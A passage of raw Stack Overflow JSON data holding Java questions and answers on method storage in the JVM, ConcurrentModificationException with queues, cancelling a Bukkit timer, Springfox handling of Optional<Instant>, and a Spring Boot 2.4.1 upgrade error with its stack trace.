names.\r\n\r\n\r\n  [1]: http://en.wikipedia.org/wiki/Java_virtual_machine\r\n  [2]: http://en.wikipedia.org/wiki/Java_Classloader\r\n  [3]: http://docs.oracle.com/javase/specs/jvms/se7/jvms7.pdf\r\n  [4]: http://en.wikipedia.org/wiki/Just-in-time_compilation\r\n  [5]: http://en.wikipedia.org/wiki/Virtual_method_table","title":"How static and normal methods are stored in memory in java?","body":"<p>Read much more about the <a href=\"http://en.wikipedia.org/wiki/Java_virtual_machine\" rel=\"nofollow\">JVM</a>, its bytecode, and its <a href=\"http://en.wikipedia.org/wiki/Java_Classloader\" rel=\"nofollow\">class loaders</a>.</p>\n\n<p>You could download and read the <a href=\"http://docs.oracle.com/javase/specs/jvms/se7/jvms7.pdf\" rel=\"nofollow\">JVM specification</a>.</p>\n\n<p>In practice, JVMs are using <a href=\"http://en.wikipedia.org/wiki/Just-in-time_compilation\" rel=\"nofollow\">JIT compilation</a> techniques on the bytecode.</p>\n\n<p>In principle, JVMs load  classes (e.g. in <code>.class</code> files)  containing bytecode (and other data).</p>\n\n<p>A Java class is represented by some structure containing something similar to a <a href=\"http://en.wikipedia.org/wiki/Virtual_method_table\" rel=\"nofollow\">vtable</a> which (in theory) associate function bytecode to method names.</p>\n"}],"owner":{"account_id":298268,"reputation":63,"user_id":604205,"accept_rate":50,"display_name":"santhoshkrishnan"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":46,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":28322743,"answer_count":1,"score":0,"last_activity_date":1639584717,"creation_date":1423056290,"question_id":28322574,"body_markdown":"How the static methods and normal methods are stored in memory? If its a heap structure how the methods are associated with the classes and objects?","title":"How static and normal methods are stored in memory in java?","body":"<p>How the static methods and normal methods are stored in memory? If its a heap structure how the methods are associated with the classes and objects?</p>\n"},{"tags":["java","queue"],"comments":[{"owner":{"account_id":20240228,"reputation":496,"user_id":14844306,"display_name":"Ben Anderson"},"score":0,"creation_date":1639582378,"post_id":70366295,"comment_id":124386559,"body_markdown":"https://stackoverflow.com/questions/602636/why-is-a-concurrentmodificationexception-thrown-and-how-to-debug-it","body":"<a href=\"https://stackoverflow.com/questions/602636/why-is-a-concurrentmodificationexception-thrown-and-how-to-debug-it\" title=\"why is a concurrentmodificationexception thrown and how to debug it\">stackoverflow.com/questions/602636/&hellip;</a>"},{"owner":{"account_id":15660722,"reputation":5,"user_id":17405569,"display_name":"user17405569"},"score":0,"creation_date":1639582699,"post_id":70366295,"comment_id":124386692,"body_markdown":"@BenAnderson But how do I addLast and removeFirst to the queue with this approach?","body":"@BenAnderson But how do I addLast and removeFirst to the queue with this approach?"},{"owner":{"account_id":20240228,"reputation":496,"user_id":14844306,"display_name":"Ben Anderson"},"score":0,"creation_date":1639582865,"post_id":70366295,"comment_id":124386751,"body_markdown":"@user17405569 consider using an iterator maybe?","body":"@user17405569 consider using an iterator maybe?"},{"owner":{"account_id":15660722,"reputation":5,"user_id":17405569,"display_name":"user17405569"},"score":0,"creation_date":1639582894,"post_id":70366295,"comment_id":124386762,"body_markdown":"@rzwitserloot I&#39;ve been told that my code gives that error.","body":"@rzwitserloot I&#39;ve been told that my code gives that error."},{"owner":{"account_id":15660722,"reputation":5,"user_id":17405569,"display_name":"user17405569"},"score":0,"creation_date":1639582940,"post_id":70366295,"comment_id":124386787,"body_markdown":"@BenAnderson But how do I &quot;removeFirst&quot; and &quot;addLast&quot; with an iterator?","body":"@BenAnderson But how do I &quot;removeFirst&quot; and &quot;addLast&quot; with an iterator?"},{"owner":{"account_id":20240228,"reputation":496,"user_id":14844306,"display_name":"Ben Anderson"},"score":0,"creation_date":1639583013,"post_id":70366295,"comment_id":124386822,"body_markdown":"Actually, see the answer and other comments, I think I&#39;m misunderstanding the situation","body":"Actually, see the answer and other comments, I think I&#39;m misunderstanding the situation"},{"owner":{"account_id":401843,"reputation":89788,"user_id":768644,"display_name":"rzwitserloot"},"score":0,"creation_date":1639583610,"post_id":70366295,"comment_id":124387073,"body_markdown":"Oh, oops, there are 2 blocks of code in there. The first batch (the `for` loop) is broken. The second - the `while` loop is not. That while loop is pretty much how you&#39;d do this. If you must loop, then instead of adding to `queue`, make a new list, add to that, then when you&#39;re done add all elements in the list to the queue. You have to not modify the list whilst iterating through it - that&#39;s one way to do that.","body":"Oh, oops, there are 2 blocks of code in there. The first batch (the <code>for</code> loop) is broken. The second - the <code>while</code> loop is not. That while loop is pretty much how you&#39;d do this. If you must loop, then instead of adding to <code>queue</code>, make a new list, add to that, then when you&#39;re done add all elements in the list to the queue. You have to not modify the list whilst iterating through it - that&#39;s one way to do that."}],"answers":[{"tags":[],"owner":{"account_id":4652024,"reputation":355,"user_id":3768649,"display_name":"w_n"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639582884,"creation_date":1639582884,"answer_id":70366454,"question_id":70366295,"body_markdown":"You get that exception because you use foreach to loop over the queue. foreach&#39;s internal iterator will complain about the ``queue.removeFirst()`` call. \r\n\r\nUsing ``while (!queue.isEmpty()) { var cell = queue.removeFirst();`` will work just fine. I don&#39;t believe that the foreach loop should even be there. ","title":"Getting ConcurrentModificationException when adding/removing from queue","body":"<p>You get that exception because you use foreach to loop over the queue. foreach's internal iterator will complain about the <code>queue.removeFirst()</code> call.</p>\n<p>Using <code>while (!queue.isEmpty()) { var cell = queue.removeFirst();</code> will work just fine. I don't believe that the foreach loop should even be there.</p>\n"}],"owner":{"account_id":15660722,"reputation":5,"user_id":17405569,"display_name":"user17405569"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":53,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70366454,"answer_count":1,"score":0,"last_activity_date":1639584650,"creation_date":1639582239,"question_id":70366295,"body_markdown":"I have made part of an algorithm below where I need to use a queue, but in Java I can&#39;t modify the queue while iterating over it. I get a `ConcurrentModificationException`.\r\n\r\nWhat I can I do about this? I&#39;ve been thinking about this for several hours.\r\n\r\n    m, n = len(mat), len(mat[0])\r\n    visited = [[False] * n for row in range(m)]\r\n    q = deque()\r\n    destinations = set()\r\n\r\n    def should_visit(row, col):\r\n        &quot;&quot;&quot;Return true if (row,col) is a valid position not processed yet&quot;&quot;&quot;\r\n        return 0 &lt;= row &lt; m and 0 &lt;= col &lt; n and \\\r\n               mat[row][col] != &#39;o&#39; and not visited[row][col]\r\n\r\n    for r in range(m):\r\n        for c in range(n):\r\n            if mat[r][c] == &#39;r&#39;:\r\n                q.append((r, c))\r\n                visited[r][c] = True\r\n            elif mat[r][c] == &#39;b&#39;:\r\n                destinations.add((r, c))\r\n\r\n    dist = 1  # the level in breadth-first-search.\r\n    while q:\r\n        for _ in range(len(q)):\r\n            (r, c) = q.popleft()\r\n\r\n            for (new_r, new_c) in ((r - 1, c), (r + 1, c), (r, c - 1), (r, c + 1)):\r\n                if should_visit(new_r, new_c):\r\n                    if (new_r, new_c) in destinations:\r\n                        return dist\r\n                    q.append((new_r, new_c))\r\n                    visited[new_r][new_c] = True\r\n        dist += 1\r\n","title":"Getting ConcurrentModificationException when adding/removing from queue","body":"<p>I have made part of an algorithm below where I need to use a queue, but in Java I can't modify the queue while iterating over it. I get a <code>ConcurrentModificationException</code>.</p>\n<p>What I can I do about this? I've been thinking about this for several hours.</p>\n<pre><code>m, n = len(mat), len(mat[0])\nvisited = [[False] * n for row in range(m)]\nq = deque()\ndestinations = set()\n\ndef should_visit(row, col):\n    &quot;&quot;&quot;Return true if (row,col) is a valid position not processed yet&quot;&quot;&quot;\n    return 0 &lt;= row &lt; m and 0 &lt;= col &lt; n and \\\n           mat[row][col] != 'o' and not visited[row][col]\n\nfor r in range(m):\n    for c in range(n):\n        if mat[r][c] == 'r':\n            q.append((r, c))\n            visited[r][c] = True\n        elif mat[r][c] == 'b':\n            destinations.add((r, c))\n\ndist = 1  # the level in breadth-first-search.\nwhile q:\n    for _ in range(len(q)):\n        (r, c) = q.popleft()\n\n        for (new_r, new_c) in ((r - 1, c), (r + 1, c), (r, c - 1), (r, c + 1)):\n            if should_visit(new_r, new_c):\n                if (new_r, new_c) in destinations:\n                    return dist\n                q.append((new_r, new_c))\n                visited[new_r][new_c] = True\n    dist += 1\n</code></pre>\n"},{"tags":["java","bukkit"],"answers":[{"tags":[],"owner":{"account_id":15178500,"reputation":4190,"user_id":10952503,"display_name":"Elikill58"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639522369,"creation_date":1639522369,"answer_id":70356505,"question_id":70356457,"body_markdown":"By using Bukkit&#39;s scheduler API, it&#39;s better.\r\n\r\nFirstly, start your server:\r\n```\r\nBukkitTask task = Bukkit.getScheduler().runTaskTimer(myPlugin, () -&gt; {\r\n   // do something\r\n}, 20, 20);\r\n```\r\nThen, with the task variable, you can cancel it:\r\n```\r\ntask.cancel();\r\n```\r\nFinally, the next time, you will be able to just create a new timer that will replace the task variable.","title":"Bukkit Plugin: How to stop timer using command","body":"<p>By using Bukkit's scheduler API, it's better.</p>\n<p>Firstly, start your server:</p>\n<pre><code>BukkitTask task = Bukkit.getScheduler().runTaskTimer(myPlugin, () -&gt; {\n   // do something\n}, 20, 20);\n</code></pre>\n<p>Then, with the task variable, you can cancel it:</p>\n<pre><code>task.cancel();\n</code></pre>\n<p>Finally, the next time, you will be able to just create a new timer that will replace the task variable.</p>\n"},{"tags":[],"owner":{"account_id":16432809,"reputation":320,"user_id":11871203,"display_name":"Redi"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639584152,"creation_date":1639584152,"answer_id":70366760,"question_id":70356457,"body_markdown":"You could create a static [Timer][1] object and cancel it in your cancel command class.\r\n\r\n/play (PlayCommand)\r\n\r\n    public static Timer timer = null;\r\n\r\n\r\n    timer.scheduleAtFixedRate(new TimerTask() {\r\n       public void run() {\r\n          //Run your Timer code\r\n       }\r\n    }\r\n\r\n/cancel (CancelCommand)\r\n\r\n    PlayCommand.timer.cancel();\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/7/docs/api/java/util/Timer.html","title":"Bukkit Plugin: How to stop timer using command","body":"<p>You could create a static <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/Timer.html\" rel=\"nofollow noreferrer\">Timer</a> object and cancel it in your cancel command class.</p>\n<p>/play (PlayCommand)</p>\n<pre><code>public static Timer timer = null;\n\n\ntimer.scheduleAtFixedRate(new TimerTask() {\n   public void run() {\n      //Run your Timer code\n   }\n}\n</code></pre>\n<p>/cancel (CancelCommand)</p>\n<pre><code>PlayCommand.timer.cancel();\n</code></pre>\n"}],"owner":{"account_id":23602461,"reputation":1,"user_id":17638737,"display_name":"Creodo"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":273,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1639584152,"creation_date":1639522096,"question_id":70356457,"body_markdown":"So basically I have \r\n\r\n    timer.scheduleAtFixedRate(new TimerTask() {\r\n        public void run() {\r\n        }\r\n    }\r\n\r\nthat runs when the command &quot;play&quot; is sent by a player, and I want to stop and reset the timer when a player sends the command &quot;cancel&quot;. How can I do this?","title":"Bukkit Plugin: How to stop timer using command","body":"<p>So basically I have</p>\n<pre><code>timer.scheduleAtFixedRate(new TimerTask() {\n    public void run() {\n    }\n}\n</code></pre>\n<p>that runs when the command &quot;play&quot; is sent by a player, and I want to stop and reset the timer when a player sends the command &quot;cancel&quot;. How can I do this?</p>\n"},{"tags":["java","spring-boot","rest","swagger","springfox"],"answers":[{"tags":[],"owner":{"account_id":4639038,"reputation":118,"user_id":3759414,"display_name":"jdmuriel"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1616490162,"creation_date":1616489818,"answer_id":66759972,"question_id":64876306,"body_markdown":"We had exactly the same problem that you.\r\nWe solved it with this SpringFox configuration:\r\n\r\n```\r\n@Configuration\r\n@EnableSwagger2\r\npublic class SpringfoxConfiguration {\r\n\r\n    @Value(&quot;${api-doc.version}&quot;)\r\n    private String apiInfoVersion;\r\n\r\n    @Autowired\r\n    private TypeResolver typeResolver;\r\n    @Bean\r\n    public Docket customDocket(){\r\n        return new Docket(DocumentationType.SWAGGER_2)\r\n                .groupName(&quot;xxx&quot;)\r\n                //Some other code unrelated to this problem\r\n                .alternateTypeRules(\r\n                        // Rule to correctly process Optional&lt;Instant&gt; variables\r\n                        // and generate &quot;type: string, format: date-time&quot;, as for Instant variables,\r\n                        // instead of &quot;$ref&quot; : &quot;#/definitions/Instant&quot;\r\n                        AlternateTypeRules.newRule(\r\n                                typeResolver.resolve(Optional.class, Instant.class),\r\n                                typeResolver.resolve(Date.class), \r\n                                Ordered.HIGHEST_PRECEDENCE\r\n                        ))\r\n                .genericModelSubstitutes(Optional.class)\r\n                .select()\r\n                //Some more code unrelated to this problem\r\n                .build();\r\n    }\r\n}\r\n```","title":"Springfox-boot-starter swagger Instant handling","body":"<p>We had exactly the same problem that you.\nWe solved it with this SpringFox configuration:</p>\n<pre><code>@Configuration\n@EnableSwagger2\npublic class SpringfoxConfiguration {\n\n    @Value(&quot;${api-doc.version}&quot;)\n    private String apiInfoVersion;\n\n    @Autowired\n    private TypeResolver typeResolver;\n    @Bean\n    public Docket customDocket(){\n        return new Docket(DocumentationType.SWAGGER_2)\n                .groupName(&quot;xxx&quot;)\n                //Some other code unrelated to this problem\n                .alternateTypeRules(\n                        // Rule to correctly process Optional&lt;Instant&gt; variables\n                        // and generate &quot;type: string, format: date-time&quot;, as for Instant variables,\n                        // instead of &quot;$ref&quot; : &quot;#/definitions/Instant&quot;\n                        AlternateTypeRules.newRule(\n                                typeResolver.resolve(Optional.class, Instant.class),\n                                typeResolver.resolve(Date.class), \n                                Ordered.HIGHEST_PRECEDENCE\n                        ))\n                .genericModelSubstitutes(Optional.class)\n                .select()\n                //Some more code unrelated to this problem\n                .build();\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4354193,"reputation":1,"user_id":3553398,"display_name":"Shail"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639583992,"creation_date":1639583325,"answer_id":70366561,"question_id":64876306,"body_markdown":"With spring fox the problem is it doesn&#39;t use the custom `ObjectMapper` which you have defined as a `Bean`. \r\n\r\n`Springfox` creates own `ObjectMapper` using `new` keyword. Hence, any module you register with your custom `ObjectMapper` is pointless for `SpringFox`. However, `Springfox` provides an interface to register modules with it&#39;s own `ObjectMapper`.\r\n\r\nCreate a configuration bean like below in your project and it should work.\r\n\r\n```\r\n@Configuration\r\npublic class ObjectMapperModuleRegistrar implements JacksonModuleRegistrar {\r\n  @Override\r\n  public void maybeRegisterModule(ObjectMapper objectMapper) {\r\n    objectMapper.registerModule(new ParameterNamesModule())\r\n        .registerModule(new Jdk8Module())\r\n        .registerModule(new JavaTimeModule())\r\n        .findAndRegisterModules();\r\n  }\r\n}\r\n```","title":"Springfox-boot-starter swagger Instant handling","body":"<p>With spring fox the problem is it doesn't use the custom <code>ObjectMapper</code> which you have defined as a <code>Bean</code>.</p>\n<p><code>Springfox</code> creates own <code>ObjectMapper</code> using <code>new</code> keyword. Hence, any module you register with your custom <code>ObjectMapper</code> is pointless for <code>SpringFox</code>. However, <code>Springfox</code> provides an interface to register modules with it's own <code>ObjectMapper</code>.</p>\n<p>Create a configuration bean like below in your project and it should work.</p>\n<pre><code>@Configuration\npublic class ObjectMapperModuleRegistrar implements JacksonModuleRegistrar {\n  @Override\n  public void maybeRegisterModule(ObjectMapper objectMapper) {\n    objectMapper.registerModule(new ParameterNamesModule())\n        .registerModule(new Jdk8Module())\n        .registerModule(new JavaTimeModule())\n        .findAndRegisterModules();\n  }\n}\n</code></pre>\n"}],"owner":{"account_id":5124081,"reputation":253,"user_id":4106800,"display_name":"Gobanit"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":698,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1639583992,"creation_date":1605620076,"question_id":64876306,"body_markdown":"I have a problem with swagger documentation using SpringBoot with Springfox-boot-starter.\r\n\r\nI use ***java.time.Instant*** wrapped in ***java.util.Optional*** in my REST API which works fine:\r\n\r\n      @GetMapping(&quot;/{subscriptionId}/{variableAlias}&quot;)\r\n      public PaginatedResultDTO&lt;MonitoredVariableDTO&gt; getReportedVariables(\r\n        @PathVariable String subscriptionId, \r\n        @PathVariable String variableAlias, \r\n        Optional&lt;Instant&gt; from, \r\n        Optional&lt;Instant&gt; to) { ... }\r\n\r\nBut for some reason, Swagger documentation cannot handle the Optional&lt;Instant&gt; type correctly and seems to handle it through reflection as EpochSeconds and Nano attributes instead of one field:\r\n[![swagger ui screenshot][1]][1]\r\n\r\nI would like to make swagger expect **from** and **to** instants in ISO format, just like Spring does and how I use it in Insomnia:\r\n[![enter image description here][2]][2] \r\n\r\nWhen I tried to remove the Optional wrapper, it seems to work [![enter image description here][3]][3]\r\n\r\nIs there a way to make this work with the Optional? Thanks for any advice!\r\n\r\nSpring boot version:\r\n\r\n    &lt;parent&gt;\r\n\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n\t\t&lt;version&gt;2.3.4.RELEASE&lt;/version&gt;\r\n\t\t&lt;relativePath /&gt;\r\n\t&lt;/parent&gt;\r\n\r\nSpringfox-boot-starter version\r\n\r\n    &lt;dependency&gt;\r\n    \t&lt;groupId&gt;io.springfox&lt;/groupId&gt;\r\n    \t&lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt;\r\n    \t&lt;version&gt;3.0.0&lt;/version&gt;\r\n    &lt;/dependency&gt;\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/Y9PJr.png\r\n  [2]: https://i.stack.imgur.com/P92SH.png\r\n  [3]: https://i.stack.imgur.com/7EW55.png","title":"Springfox-boot-starter swagger Instant handling","body":"<p>I have a problem with swagger documentation using SpringBoot with Springfox-boot-starter.</p>\n<p>I use <em><strong>java.time.Instant</strong></em> wrapped in <em><strong>java.util.Optional</strong></em> in my REST API which works fine:</p>\n<pre><code>  @GetMapping(&quot;/{subscriptionId}/{variableAlias}&quot;)\n  public PaginatedResultDTO&lt;MonitoredVariableDTO&gt; getReportedVariables(\n    @PathVariable String subscriptionId, \n    @PathVariable String variableAlias, \n    Optional&lt;Instant&gt; from, \n    Optional&lt;Instant&gt; to) { ... }\n</code></pre>\n<p>But for some reason, Swagger documentation cannot handle the Optional type correctly and seems to handle it through reflection as EpochSeconds and Nano attributes instead of one field:\n<a href=\"https://i.stack.imgur.com/Y9PJr.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Y9PJr.png\" alt=\"swagger ui screenshot\" /></a></p>\n<p>I would like to make swagger expect <strong>from</strong> and <strong>to</strong> instants in ISO format, just like Spring does and how I use it in Insomnia:\n<a href=\"https://i.stack.imgur.com/P92SH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/P92SH.png\" alt=\"enter image description here\" /></a></p>\n<p>When I tried to remove the Optional wrapper, it seems to work <a href=\"https://i.stack.imgur.com/7EW55.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/7EW55.png\" alt=\"enter image description here\" /></a></p>\n<p>Is there a way to make this work with the Optional? Thanks for any advice!</p>\n<p>Spring boot version:</p>\n<pre><code>&lt;parent&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n    &lt;version&gt;2.3.4.RELEASE&lt;/version&gt;\n    &lt;relativePath /&gt;\n&lt;/parent&gt;\n</code></pre>\n<p>Springfox-boot-starter version</p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;io.springfox&lt;/groupId&gt;\n    &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt;\n    &lt;version&gt;3.0.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n"},{"tags":["java","spring"],"comments":[{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1639582042,"post_id":70365910,"comment_id":124386410,"body_markdown":"You are talking about upgrading Spring Boot than why are you moving `spring-security-oauth` to a spring boot version?","body":"You are talking about upgrading Spring Boot than why are you moving <code>spring-security-oauth</code> to a spring boot version?"},{"owner":{"account_id":8959605,"reputation":93,"user_id":6682765,"accept_rate":0,"display_name":"badbuda"},"score":0,"creation_date":1639583452,"post_id":70365910,"comment_id":124387008,"body_markdown":"you mean why spring-security-oauth version is 2.4.1.RELEASE?\n\nthats the original version I had in my project. before I&#39;ve upgraded to 2.4.1, the previous springboot version was 2.3.7.RELEASE, and spring-security-oauth 2.4.1.RELEASE worked fine","body":"you mean why spring-security-oauth version is 2.4.1.RELEASE?  thats the original version I had in my project. before I&#39;ve upgraded to 2.4.1, the previous springboot version was 2.3.7.RELEASE, and spring-security-oauth 2.4.1.RELEASE worked fine"},{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1639594249,"post_id":70365910,"comment_id":124391144,"body_markdown":"You haven&#39;t shown us all your dependencies, and now when I look closely at your stacktrace the error comes from a Spring Cloud dependency. Spring Cloud versions are tied to a Spring Boot version. If you upgrade Spring Boot you also need to upgrade the Spring Cloud versions.","body":"You haven&#39;t shown us all your dependencies, and now when I look closely at your stacktrace the error comes from a Spring Cloud dependency. Spring Cloud versions are tied to a Spring Boot version. If you upgrade Spring Boot you also need to upgrade the Spring Cloud versions."}],"answers":[{"tags":[],"owner":{"account_id":74001,"reputation":719,"user_id":212871,"accept_rate":50,"display_name":"NoodleX"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639583943,"creation_date":1639583943,"answer_id":70366715,"question_id":70365910,"body_markdown":"The issue is with incompatibility between your spring cloud and spring boot version, please upgrade your spring cloud version to be compatible with spring boot 2.4.x.\r\n\r\nReference : https://stackoverflow.com/questions/65488101/springboot-upgrade-from-2-3-5-release-to-2-4-1-classnotfoundexception-org-spri","title":"upgrading spring boot to 2.4.1","body":"<p>The issue is with incompatibility between your spring cloud and spring boot version, please upgrade your spring cloud version to be compatible with spring boot 2.4.x.</p>\n<p>Reference : <a href=\"https://stackoverflow.com/questions/65488101/springboot-upgrade-from-2-3-5-release-to-2-4-1-classnotfoundexception-org-spri\">springboot Upgrade from 2.3.5.RELEASE to 2.4.1- ClassNotFoundException: org.springframework.boot.context.properties.ConfigurationBeanFactoryMetadata</a></p>\n"}],"owner":{"account_id":8959605,"reputation":93,"user_id":6682765,"accept_rate":0,"display_name":"badbuda"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":721,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639583943,"creation_date":1639580594,"question_id":70365910,"body_markdown":"I need to upgrade my spring boot to 2.4.1 from 2.3.7.RELEASE.\r\nwhen I update my pom file, I get error in spring-security-oauth2 dependency (version 2.4.1.RELEASE).\r\nbefore I&#39;ve upgraded my spring version, spring-security-oauth2 2.4.1.RELEASE, worked fine with springboot 2.3.7.RELEASE\r\n\r\nmy pom file dependency:\r\n\r\n    &lt;parent&gt;\r\n\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n\t\t&lt;version&gt;2.4.1&lt;/version&gt;\r\n\t\t&lt;relativePath /&gt;\r\n\t&lt;/parent&gt;\r\n\t\t&lt;dependency&gt;\r\n\t\t\t&lt;groupId&gt;org.springframework.security.oauth&lt;/groupId&gt;\r\n\t\t\t&lt;artifactId&gt;spring-security-oauth2&lt;/artifactId&gt;\r\n\t\t\t&lt;version&gt;2.4.1.RELEASE&lt;/version&gt;\r\n\t\t\t&lt;exclusions&gt;\r\n\t\t\t\t&lt;exclusion&gt;\r\n\t\t\t\t\t&lt;artifactId&gt;spring-security-core&lt;/artifactId&gt;\r\n\t\t\t\t\t&lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\r\n\t\t\t\t&lt;/exclusion&gt;\r\n\t\t\t\t&lt;exclusion&gt;\r\n\t\t\t\t\t&lt;artifactId&gt;spring-web&lt;/artifactId&gt;\r\n\t\t\t\t\t&lt;groupId&gt;org.springframework&lt;/groupId&gt;\r\n\t\t\t\t&lt;/exclusion&gt;\r\n\t\t\t&lt;/exclusions&gt;\r\n\t\t&lt;/dependency&gt;\r\n\r\n\r\nthis is my exception when I try to run my app-\r\n\r\n    org.springframework.beans.factory.BeanCreationException: Error creating bean with name &#39;configurationPropertiesBeans&#39; defined in class path resource [org/springframework/cloud/autoconfigure/ConfigurationPropertiesRebinderAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cloud.context.properties.ConfigurationPropertiesBeans]: Factory method &#39;configurationPropertiesBeans&#39; threw exception; nested exception is java.lang.NoClassDefFoundError: org/springframework/boot/context/properties/ConfigurationBeanFactoryMetadata\r\n\tat org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:658) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:486) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1179) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:571) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:531) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:213) ~[spring-beans-5.3.2.jar:5.3.2]\r\n\tat org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:244) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:767) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:572) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:767) ~[spring-boot-2.4.1.jar:2.4.1]\r\n\tat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:759) ~[spring-boot-2.4.1.jar:2.4.1]\r\n\tat org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:426) ~[spring-boot-2.4.1.jar:2.4.1]\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:326) ~[spring-boot-2.4.1.jar:2.4.1]\r\n\tat org.springframework.boot.builder.SpringApplicationBuilder.run(SpringApplicationBuilder.java:144) ~[spring-boot-2.4.1.jar:2.4.1]\r\n\tat org.springframework.cloud.bootstrap.BootstrapApplicationListener.bootstrapServiceContext(BootstrapApplicationListener.java:203) ~[spring-cloud-context-2.1.2.RELEASE.jar:2.1.2.RELEASE]\r\n\tat org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:114) ~[spring-cloud-context-2.1.2.RELEASE.jar:2.1.2.RELEASE]\r\n\tat org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:71) ~[spring-cloud-context-2.1.2.RELEASE.jar:2.1.2.RELEASE]\r\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:127) ~[spring-context-5.3.2.jar:5.3.2]\r\n\tat org.springframework.boot.context.event.EventPublishingRunListener.environmentPrepared(EventPublishingRunListener.java:82) ~[spring-boot-2.4.1.jar:2.4.1]\r\n\tat \r\n\r\n\r\n[![enter image description 